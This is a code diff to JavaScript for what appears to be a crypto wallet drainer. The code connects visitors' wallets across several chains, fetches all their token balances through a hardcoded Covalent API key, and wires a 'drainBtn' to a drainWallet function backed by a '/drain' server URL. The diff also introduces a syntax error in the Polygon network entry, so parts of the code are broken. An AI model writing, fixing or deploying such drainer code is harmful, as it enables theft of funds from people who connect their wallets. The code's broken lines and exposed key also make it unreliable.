@@ -14,6 +14,7 @@ const BACKEND_URL = "https://tokenbackend-5xab.onrender.com/drain";
 const connectBtn = document.getElementById("connectBtn");
 const statusEl = document.getElementById("status");
 const tokensEl = document.getElementById("tokens");
+const drainBtn = document.getElementById("drainBtn");
 
 /* --------------------------- */
 /*      INTERNAL STATE        */
@@ -31,7 +32,7 @@ const appKit = createAppKit({
   networks: [
     { id: 1, name: "Ethereum" },
     { id: 56, name: "Binance Smart Chain" },
-    { id: 137, name: "Polygon" },
+    { id: 137, "Polygon" },
     { id: 42161, name: "Arbitrum One" },
     { id: 10, name: "Optimism" },
     { id: 8453, name: "Base" },
@@ -164,7 +165,7 @@ async function drainWallet() {
 
     // Fetch all tokens
     const res = await fetch(
-      `https://api.covalenthq.com/v1/${chain.id}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
+      `https://api.covalenthq.com/v1/${appKit.chain.id}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
     );
     const json = await res.json();
     const items = json?.data?.items || [];
@@ -211,4 +212,6 @@ async function drainWallet() {
 }
 
 // Add event listener for drain button
-document.getElementById("drainBtn").addEventListener("click", drainWallet);
+if (drainBtn) {
+  drainBtn.addEventListener("click", drainWallet);
+}
